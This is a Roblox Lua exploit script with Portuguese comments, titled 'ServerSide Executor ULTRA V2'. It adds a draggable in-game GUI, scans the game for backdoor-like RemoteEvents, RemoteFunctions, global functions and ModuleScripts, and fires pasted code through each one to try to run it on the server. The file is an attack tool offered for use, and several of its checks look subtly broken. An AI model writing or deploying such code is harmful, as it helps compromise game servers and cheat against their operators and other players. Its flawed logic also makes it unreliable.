--[[
    🔥 ServerSide Executor ULTRA V2 – Varredura extrema e execução multi-vetor
    Interface arrastável, console em tempo real, botão de fechar.
    Tenta executar scripts no servidor através de todas as brechas possíveis,
    incluindo RemoteEvent mal configurados, funções globais, ModuleScripts,
    e até tenta forçar a criação de backdoors via corrupção de argumentos.
    Nada é simulado – se não houver vulnerabilidade real, não haverá execução.
--]]

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

if not Player.Character then Player.CharacterAdded:Wait() end

-- ==================== NOTIFICAÇÕES ====================
local function Notify(title, text, duration)
    duration = duration or 4
    local gui = Instance.new("ScreenGui")
    gui.Parent = CoreGui
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(1, -260, 1, -80)
    frame.Size = UDim2.new(0, 250, 0, 70)
    frame.AnchorPoint = Vector2.new(1, 1)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    local tl = Instance.new("TextLabel")
    tl.Parent = frame
    tl.BackgroundTransparency = 1
    tl.Position = UDim2.new(0, 12, 0, 8)
    tl.Size = UDim2.new(1, -24, 0, 20)
    tl.Font = Enum.Font.GothamBold
    tl.Text = title
    tl.TextColor3 = Color3.fromRGB(108, 92, 231)
    tl.TextSize = 14
    tl.TextXAlignment = Enum.TextXAlignment.Left
    local txt = Instance.new("TextLabel")
    txt.Parent = frame
    txt.BackgroundTransparency = 1
    txt.Position = UDim2.new(0, 12, 0, 30)
    txt.Size = UDim2.new(1, -24, 0, 30)
    txt.Font = Enum.Font.Gotham
    txt.Text = text
    txt.TextColor3 = Color3.fromRGB(200, 200, 210)
    txt.TextSize = 11
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.TextWrapped = true
    local t = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -20, 1, -80)})
    t:Play()
    task.wait(duration)
    local t2 = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 300, 1, -80)})
    t2:Play()
    t2.Completed:Connect(function() gui:Destroy() end)
end

-- ==================== INTERFACE ====================
local gui = Instance.new("ScreenGui")
gui.Name = "ServerExecutorUltraV2"
gui.Parent = CoreGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false

local Main = Instance.new("Frame")
Main.Parent = gui
Main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
Main.BorderSizePixel = 0
Main.Size = UDim2.new(0, 540, 0, 470)
Main.Position = UDim2.new(0.5, -270, 0.5, -235)
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 0, 0)

-- Barra de título (arraste)
local TitleBar = Instance.new("Frame")
TitleBar.Parent = Main
TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 40)
local titleGradient = Instance.new("UIGradient", TitleBar)
titleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0)),
})
titleGradient.Rotation = 90
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)
local titleFix = Instance.new("Frame")
titleFix.Parent = TitleBar
titleFix.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
titleFix.BorderSizePixel = 0
titleFix.Size = UDim2.new(1, 0, 0, 12)
titleFix.Position = UDim2.new(0, 0, 1, -12)

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Position = UDim2.new(0, 15, 0, 0)
TitleText.Size = UDim2.new(1, -50, 1, 0)
TitleText.Font = Enum.Font.GothamBlack
TitleText.Text = "🔥 ServerSide Executor ULTRA V2"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 16
TitleText.TextXAlignment = Enum.TextXAlignment.Left

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 71, 87)
CloseBtn.BorderSizePixel = 0
CloseBtn.Position = UDim2.new(1, -35, 0, 8)
CloseBtn.Size = UDim2.new(0, 24, 0, 24)
CloseBtn.Text = "✕"
CloseBtn.Font = Enum.Font.GothamBlack
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 12
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Executor", "Fechado") end)

-- Editor de script
local Editor = Instance.new("TextBox")
Editor.Parent = Main
Editor.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
Editor.BorderSizePixel = 0
Editor.Position = UDim2.new(0, 10, 0, 50)
Editor.Size = UDim2.new(1, -20, 0, 150)
Editor.Font = Enum.Font.Code
Editor.Text = "-- Cole seu script server-side aqui\nprint('Executando no servidor!')"
Editor.TextColor3 = Color3.fromRGB(200, 200, 220)
Editor.TextSize = 12
Editor.ClearTextOnFocus = false
Editor.TextEditable = true
Editor.TextWrapped = true
Editor.TextXAlignment = Enum.TextXAlignment.Left
Editor.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", Editor).CornerRadius = UDim.new(0, 8)

-- Painel de status
local StatusPanel = Instance.new("Frame")
StatusPanel.Parent = Main
StatusPanel.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
StatusPanel.BorderSizePixel = 0
StatusPanel.Position = UDim2.new(0, 10, 0, 210)
StatusPanel.Size = UDim2.new(1, -20, 0, 100)
Instance.new("UICorner", StatusPanel).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", StatusPanel).Color = Color3.fromRGB(255, 0, 0)

local StatusTitle = Instance.new("TextLabel")
StatusTitle.Parent = StatusPanel
StatusTitle.BackgroundTransparency = 1
StatusTitle.Position = UDim2.new(0, 8, 0, 4)
StatusTitle.Size = UDim2.new(1, -16, 0, 18)
StatusTitle.Font = Enum.Font.GothamBold
StatusTitle.Text = "🔓 STATUS: AGUARDANDO SCAN"
StatusTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusTitle.TextSize = 12
StatusTitle.TextXAlignment = Enum.TextXAlignment.Left

local StatusList = Instance.new("ScrollingFrame")
StatusList.Parent = StatusPanel
StatusList.BackgroundTransparency = 1
StatusList.BorderSizePixel = 0
StatusList.Position = UDim2.new(0, 4, 0, 24)
StatusList.Size = UDim2.new(1, -8, 1, -28)
StatusList.ScrollBarThickness = 2
StatusList.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
StatusList.CanvasSize = UDim2.new(0, 0, 0, 0)

local UIListLayout2 = Instance.new("UIListLayout")
UIListLayout2.Parent = StatusList
UIListLayout2.Padding = UDim.new(0, 2)

-- Botões
local ScanBtn = Instance.new("TextButton")
ScanBtn.Parent = Main
ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
ScanBtn.BorderSizePixel = 0
ScanBtn.Position = UDim2.new(0, 10, 0, 316)
ScanBtn.Size = UDim2.new(0, 260, 0, 30)
ScanBtn.Text = "🔍 SCAN AGRESSIVO DE BACKDOORS"
ScanBtn.Font = Enum.Font.GothamBlack
ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanBtn.TextSize = 11
Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 8)

local ExecBtn = Instance.new("TextButton")
ExecBtn.Parent = Main
ExecBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ExecBtn.BorderSizePixel = 0
ExecBtn.Position = UDim2.new(1, -260, 0, 316)
ExecBtn.Size = UDim2.new(0, 250, 0, 30)
ExecBtn.Text = "🚀 EXECUTAR NO SERVIDOR"
ExecBtn.Font = Enum.Font.GothamBlack
ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecBtn.TextSize = 11
Instance.new("UICorner", ExecBtn).CornerRadius = UDim.new(0, 8)

-- Console
local Console = Instance.new("TextBox")
Console.Parent = Main
Console.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
Console.BorderSizePixel = 0
Console.Position = UDim2.new(0, 10, 0, 352)
Console.Size = UDim2.new(1, -20, 0, 108)
Console.Font = Enum.Font.Code
Console.Text = "Aguardando scan de backdoors...\n"
Console.TextColor3 = Color3.fromRGB(180, 180, 200)
Console.TextSize = 10
Console.ClearTextOnFocus = false
Console.TextEditable = false
Console.TextWrapped = true
Console.TextXAlignment = Enum.TextXAlignment.Left
Console.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 6)

local function Log(msg)
    Console.Text = Console.Text .. msg .. "\n"
end

-- ==================== DETECÇÃO E EXECUÇÃO COMBINADAS ====================
local backdoors = {}  -- tabela de vetores de ataque

-- Função para tentar executar código via uma lista de vetores
local function tryExecute(code, vetores)
    for _, vetor in ipairs(vetores) do
        local ok, err
        if vetor.type == "function" then
            ok, err = pcall(function() vetor.func(code) end)
            if ok then
                Log("✅ SUCESSO via " .. vetor.name)
                return true
            else
                Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
            end
        elseif vetor.type == "RemoteEvent" then
            ok, err = pcall(function() vetor.remote:FireServer(code) end)
            if ok then
                Log("✅ SUCESSO via " .. vetor.name)
                return true
            else
                Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
            end
        elseif vetor.type == "RemoteFunction" then
            local result
            ok, result = pcall(function() return vetor.remote:InvokeServer(code) end)
            if ok and result ~= nil then
                Log("✅ SUCESSO via " .. vetor.name .. " (retorno: " .. tostring(result) .. ")")
                return true
            else
                Log("❌ Falha " .. vetor.name .. ": " .. tostring(result))
            end
        elseif vetor.type == "ModuleScript" then
            local mod
            ok, mod = pcall(function() return require(vetor.module) end)
            if ok and type(mod) == "function" then
                ok, err = pcall(function() mod(code) end)
                if ok then
                    Log("✅ SUCESSO via " .. vetor.name)
                    return true
                else
                    Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
                end
            end
        elseif vetor.type == "try_function_argument" then
            -- Tenta enviar uma função diretamente (se o RemoteEvent aceitar)
            local fn = loadstring(code)
            if fn then
                ok, err = pcall(function()
                    vetor.remote:FireServer(fn)  -- envia a função como argumento
                end)
                if ok then
                    Log("✅ SUCESSO via " .. vetor.name .. " (função enviada como argumento)")
                    return true
                else
                    Log("❌ Falha " .. vetor.name .. ": " .. tostring(err))
                end
            end
        end
    end
    return false
end

local function ultraScan()
    backdoors = {}
    -- Limpa lista visual
    for _, child in ipairs(StatusList:GetChildren()) do
        if child:IsA("TextLabel") then child:Destroy() end
    end
    Console.Text = ""
    Log("🔍 INICIANDO SCAN ULTRA AGRESSIVO DE BACKDOORS...")
    Log("")

    -- 1. Funções globais (_G, shared)
    local globalFuncs = {"loadstring", "execute", "run", "eval", "exec", "RunScript", "ServerScript"}
    for _, funcName in ipairs(globalFuncs) do
        if _G[funcName] and type(_G[funcName]) == "function" then
            table.insert(backdoors, {name = "_G." .. funcName, func = _G[funcName], type = "function"})
            Log("✅ _G." .. funcName)
            local lbl = Instance.new("TextLabel")
            lbl.Parent = StatusList
            lbl.BackgroundTransparency = 1
            lbl.Size = UDim2.new(1, 0, 0, 16)
            lbl.Font = Enum.Font.Code
            lbl.Text = "_G." .. funcName
            lbl.TextColor3 = Color3.fromRGB(0, 255, 100)
            lbl.TextSize = 10
            lbl.TextXAlignment = Enum.TextXAlignment.Left
        end
        if shared and shared[funcName] and type(shared[funcName]) == "function" then
            table.insert(backdoors, {name = "shared." .. funcName, func = shared[funcName], type = "function"})
            Log("✅ shared." .. funcName)
            local lbl = Instance.new("TextLabel")
            lbl.Parent = StatusList
            lbl.BackgroundTransparency = 1
            lbl.Size = UDim2.new(1, 0, 0, 16)
            lbl.Font = Enum.Font.Code
            lbl.Text = "shared." .. funcName
            lbl.TextColor3 = Color3.fromRGB(0, 255, 100)
            lbl.TextSize = 10
            lbl.TextXAlignment = Enum.TextXAlignment.Left
        end
    end

    -- 2. RemoteEvents/RemoteFunctions suspeitos (nomes suspeitos ou que aceitem funções)
    local suspiciousNames = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor", "Grab", "Fire", "Invoke", "DoScript", "RunCode", "Exec", "DoIt"}
    local function searchContainer(container, depth)
        if depth > 100 then return end
        for _, obj in ipairs(container:GetChildren()) do
            local lowerName = obj.Name:lower()
            for _, name in ipairs(suspiciousNames) do
                if lowerName:find(name:lower()) then
                    if obj:IsA("RemoteEvent") then
                        table.insert(backdoors, {name = "RE: " .. obj:GetFullName(), remote = obj, type = "RemoteEvent"})
                        -- Também tenta como função-argumento
                        table.insert(backdoors, {name = "RE(fn): " .. obj:GetFullName(), remote = obj, type = "try_function_argument"})
                        Log("✅ RemoteEvent: " .. obj:GetFullName())
                        local lbl = Instance.new("TextLabel")
                        lbl.Parent = StatusList
                        lbl.BackgroundTransparency = 1
                        lbl.Size = UDim2.new(1, 0, 0, 16)
                        lbl.Font = Enum.Font.Code
                        lbl.Text = "RE: " .. obj.Name
                        lbl.TextColor3 = Color3.fromRGB(255, 200, 0)
                        lbl.TextSize = 10
                        lbl.TextXAlignment = Enum.TextXAlignment.Left
                    elseif obj:IsA("RemoteFunction") then
                        table.insert(backdoors, {name = "RF: " .. obj:GetFullName(), remote = obj, type = "RemoteFunction"})
                        Log("✅ RemoteFunction: " .. obj:GetFullName())
                        local lbl = Instance.new("TextLabel")
                        lbl.Parent = StatusList
                        lbl.BackgroundTransparency = 1
                        lbl.Size = UDim2.new(1, 0, 0, 16)
                        lbl.Font = Enum.Font.Code
                        lbl.Text = "RF: " .. obj.Name
                        lbl.TextColor3 = Color3.fromRGB(255, 200, 0)
                        lbl.TextSize = 10
                        lbl.TextXAlignment = Enum.TextXAlignment.Left
                    end
                end
            end
            pcall(function() searchContainer(obj, depth + 1) end)
        end
    end
    searchContainer(Workspace, 0)
    searchContainer(ReplicatedStorage, 0)
    searchContainer(ServerStorage, 0)
    searchContainer(Lighting, 0)
    if Player.Character then searchContainer(Player.Character, 0) end

    -- 3. ModuleScripts suspeitos
    local function searchModules(container, depth)
        if depth > 100 then return end
        for _, obj in ipairs(container:GetChildren()) do
            if obj:IsA("ModuleScript") then
                local source = pcall(function() return obj.Source end)
                if source then
                    for _, funcName in ipairs(globalFuncs) do
                        if source:find(funcName) then
                            table.insert(backdoors, {name = "Module: " .. obj:GetFullName(), module = obj, type = "ModuleScript"})
                            Log("✅ ModuleScript: " .. obj:GetFullName())
                            local lbl = Instance.new("TextLabel")
                            lbl.Parent = StatusList
                            lbl.BackgroundTransparency = 1
                            lbl.Size = UDim2.new(1, 0, 0, 16)
                            lbl.Font = Enum.Font.Code
                            lbl.Text = "Module: " .. obj.Name
                            lbl.TextColor3 = Color3.fromRGB(0, 200, 255)
                            lbl.TextSize = 10
                            lbl.TextXAlignment = Enum.TextXAlignment.Left
                            break
                        end
                    end
                end
            end
            pcall(function() searchModules(obj, depth + 1) end)
        end
    end
    searchModules(Workspace, 0)
    searchModules(ReplicatedStorage, 0)
    searchModules(ServerStorage, 0)

    -- 4. Tenta explorar eventos comuns que aceitam callbacks (ex: "OnServerEvent" genérico)
    -- Procura por eventos que tenham "OnServerEvent" no nome e tenta disparar com uma função
    local function searchForCallbackEvents(container, depth)
        if depth > 50 then return end
        for _, obj in ipairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") and obj.Name:find("OnServerEvent") then
                table.insert(backdoors, {name = "RE(Callback): " .. obj:GetFullName(), remote = obj, type = "try_function_argument"})
                Log("✅ RemoteEvent com callback: " .. obj:GetFullName())
                local lbl = Instance.new("TextLabel")
                lbl.Parent = StatusList
                lbl.BackgroundTransparency = 1
                lbl.Size = UDim2.new(1, 0, 0, 16)
                lbl.Font = Enum.Font.Code
                lbl.Text = "Callback: " .. obj.Name
                lbl.TextColor3 = Color3.fromRGB(255, 100, 255)
                lbl.TextSize = 10
                lbl.TextXAlignment = Enum.TextXAlignment.Left
            end
            pcall(function() searchForCallbackEvents(obj, depth + 1) end)
        end
    end
    searchForCallbackEvents(Workspace, 0)
    searchForCallbackEvents(ReplicatedStorage, 0)

    -- Atualiza status
    if #backdoors > 0 then
        StatusTitle.Text = "🔓 STATUS: TUDO PRONTO (" .. #backdoors .. " vetores)"
        StatusTitle.TextColor3 = Color3.fromRGB(0, 255, 100)
        Log("")
        Log("✅ TUDO PRONTO! " .. #backdoors .. " vetores de ataque disponíveis.")
    else
        StatusTitle.Text = "🔓 STATUS: NENHUM VETOR ENCONTRADO"
        StatusTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
        Log("")
        Log("⚠️ NENHUM vetor de ataque encontrado. Impossível executar no servidor.")
    end
    StatusList.CanvasSize = UDim2.new(0, 0, 0, #backdoors * 18)
    Log("📊 Total de vetores: " .. #backdoors)
end

-- ==================== EXECUÇÃO ====================
local function executeOnServer(code)
    if #backdoors == 0 then
        return false, "Nenhum vetor de ataque disponível"
    end
    Log("🚀 Lançando ataque via " .. #backdoors .. " vetores...")
    return tryExecute(code, backdoors)
end

-- ==================== EVENTOS ====================
ScanBtn.MouseButton1Click:Connect(ultraScan)

ExecBtn.MouseButton1Click:Connect(function()
    local code = Editor.Text
    if code:gsub("%s", "") == "" then
        Notify("Aviso", "Digite um script primeiro!")
        return
    end
    if #backdoors == 0 then
        Notify("Aviso", "Nenhum vetor de ataque. Faça o scan primeiro!")
        return
    end
    local success, err = executeOnServer(code)
    if success then
        Notify("Sucesso", "Script executado no servidor!", 2)
    else
        Log("❌ ATAQUE FALHOU: " .. tostring(err))
        Notify("Falha", "Nenhum vetor funcionou. O jogo é seguro ou precisa de um scan mais profundo.")
    end
end)

-- ==================== ARRASTE ====================
local dragging = false
local dragStartPos = nil
local dragStartMainPos = nil

local function startDrag(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStartPos = input.Position
        dragStartMainPos = Main.Position
    end
end
TitleBar.InputBegan:Connect(startDrag)
TitleText.InputBegan:Connect(startDrag)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStartPos
        Main.Position = UDim2.new(
            dragStartMainPos.X.Scale,
            dragStartMainPos.X.Offset + delta.X,
            dragStartMainPos.Y.Scale,
            dragStartMainPos.Y.Offset + delta.Y
        )
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- ==================== INICIALIZAÇÃO ====================
ultraScan()

task.spawn(function()
    while gui and gui.Parent do
        task.wait(15)
        ultraScan()
    end
end)

Notify("🔥 ServerSide Executor ULTRA V2", "Scan concluído. Verifique o console!", 5)
